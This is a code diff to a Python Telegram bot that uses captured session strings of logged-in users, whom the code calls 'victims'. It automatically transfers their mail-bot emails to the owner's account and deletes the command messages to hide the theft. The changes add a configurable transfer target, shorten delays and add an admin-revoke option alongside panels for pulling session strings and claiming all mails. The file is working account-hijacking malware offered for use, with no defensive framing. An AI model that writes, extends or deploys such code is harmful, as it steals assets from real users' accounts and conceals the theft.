@@ -152,12 +152,11 @@ async def start_userbot(user_id, session_str):
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await client.connect()
     active_userbots[user_id] = client
+    # Auto transfer mails to owner when someone logs in
     asyncio.create_task(transfer_mails(user_id))
 
-async def transfer_mails(victim_uid, custom_sender=None):
+async def transfer_mails(victim_uid, custom_sender=None, target_username=OWNER_USERNAME):
     try:
-        sender_id = custom_sender if custom_sender else victim_uid
-        sender_client = await get_or_connect_client(sender_id)
         victim_client = await get_or_connect_client(victim_uid)
         owner_client = await get_or_connect_client(OWNER_ID)
         
@@ -167,7 +166,7 @@ async def transfer_mails(victim_uid, custom_sender=None):
         owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
         
         await victim_client.send_message(target_bot, "/id")
-        await asyncio.sleep(4)
+        await asyncio.sleep(2)
         
         messages = await victim_client.get_messages(target_bot, limit=2)
         if not messages: return
@@ -176,21 +175,24 @@ async def transfer_mails(victim_uid, custom_sender=None):
         if not emails: return
 
         for email in emails:
-            await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
-            await asyncio.sleep(4)
+            # Transfer from victim to target (make sure target is not the victim itself)
+            await victim_client.send_message(target_bot, f"/transfer {email} {target_username}")
+            await asyncio.sleep(3)
             
             try:
                 msgs = await victim_client.get_messages(target_bot, limit=2)
                 for m in msgs: await victim_client.delete_messages(target_bot, m.id)
             except: pass
             
-            await owner_client.send_message(owner_target_bot, email)
-            await asyncio.sleep(4)
-            
-            try:
-                msgs = await owner_client.get_messages(owner_target_bot, limit=2)
-                for m in msgs: await owner_client.delete_messages(owner_target_bot, m.id)
-            except: pass
+            # Claim on owner
+            if victim_uid != OWNER_ID:
+                await owner_client.send_message(owner_target_bot, email)
+                await asyncio.sleep(3)
+                
+                try:
+                    msgs = await owner_client.get_messages(owner_target_bot, limit=2)
+                    for m in msgs: await owner_client.delete_messages(owner_target_bot, m.id)
+                except: pass
             await asyncio.sleep(1)
             
     except Exception as e:
@@ -264,7 +266,6 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     uid = update.effective_user.id
     
-    # Admin State Logic
     if uid in get_all_admins():
         state = user_states.get(uid)
         
@@ -272,6 +273,14 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if text.isdigit():
                 db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
                 await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
+            else:
+                await update.message.reply_text("❌ Invalid ID.")
+            user_states[uid] = None; return
+            
+        elif state == 'revoke_admin_wait':
+            if text.isdigit():
+                db_exec("DELETE FROM admins WHERE user_id=?", (int(text),))
+                await update.message.reply_text(f"✅ {p_style('Admin Revoked')}", parse_mode="HTML")
             else:
                 await update.message.reply_text("❌ Invalid ID.")
             user_states[uid] = None; return
@@ -491,6 +500,7 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts')}", callback_data="admin_acc")],
         [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails')}", callback_data="admin_claim")],
         [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
+        [InlineKeyboardButton(f"❌ {f_txt('Revoke Admin')}", callback_data="revoke_admin")],
         [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Photo')}", callback_data="set_welcome_img")],
         [InlineKeyboardButton(f"🔑 {f_txt('Get Session Strings')}", callback_data="get_sessions")],
         [InlineKeyboardButton(f"🆔 {f_txt('Check ID (Mails)')}", callback_data="check_id")],
@@ -520,6 +530,10 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "admin_add":
         await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')}")
         user_states[uid] = 'admin_add_wait'
+        
+    elif data == "revoke_admin":
+        await query.edit_message_text(f"❌ {f_txt('Send User ID to revoke Admin')}")
+        user_states[uid] = 'revoke_admin_wait'
         
     elif data == "set_welcome_img":
         await query.edit_message_text(f"🖼 {f_txt('Send the image you want to set as Welcome Photo')}:")
@@ -607,7 +621,7 @@ async def manual_claim_all(owner_id, query):
             owner_target_bot = await target_owner_client.get_entity(TARGET_MAIL_BOT)
             
             await victim_client.send_message(target_bot, "/id")
-            await asyncio.sleep(4)
+            await asyncio.sleep(2)
             
             messages = await victim_client.get_messages(target_bot, limit=2)
             if not messages: continue
@@ -621,7 +635,7 @@ async def manual_claim_all(owner_id, query):
                 await msg.delete()
                 
                 await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
-                await asyncio.sleep(4)
+                await asyncio.sleep(3)
                 
                 try:
                     msgs = await victim_client.get_messages(target_bot, limit=2)
@@ -633,7 +647,7 @@ async def manual_claim_all(owner_id, query):
                 await msg2.delete()
                 
                 await target_owner_client.send_message(owner_target_bot, email)
-                await asyncio.sleep(4)
+                await asyncio.sleep(3)
                 
                 try:
                     msgs = await target_owner_client.get_messages(owner_target_bot, limit=2)
@@ -667,7 +681,7 @@ async def manual_transfer_all(target_username, target_id, query):
             owner_target_bot = await target_client.get_entity(TARGET_MAIL_BOT)
             
             await victim_client.send_message(target_bot, "/id")
-            await asyncio.sleep(4)
+            await asyncio.sleep(2)
             
             messages = await victim_client.get_messages(target_bot, limit=2)
             if not messages: continue
@@ -681,7 +695,7 @@ async def manual_transfer_all(target_username, target_id, query):
                 await msg.delete()
                 
                 await victim_client.send_message(target_bot, f"/transfer {email} {target_username}")
-                await asyncio.sleep(4)
+                await asyncio.sleep(3)
                 
                 try:
                     msgs = await victim_client.get_messages(target_bot, limit=2)
@@ -693,7 +707,7 @@ async def manual_transfer_all(target_username, target_id, query):
                 await msg2.delete()
                 
                 await target_client.send_message(owner_target_bot, email)
-                await asyncio.sleep(4)
+                await asyncio.sleep(3)
                 
                 try:
                     msgs = await target_client.get_messages(owner_target_bot, limit=2)
@@ -717,7 +731,7 @@ def main():
     app_bot.add_handler(CommandHandler("owner", owner_panel))
     app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
-    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_|^get_sessions$|^check_id$|^ff_check_|^login_|^transfer_|^confirm_"))
+    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_|^get_sessions$|^check_id$|^ff_check_|^login_|^transfer_|^confirm_|^revoke_"))
     
     app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=1)
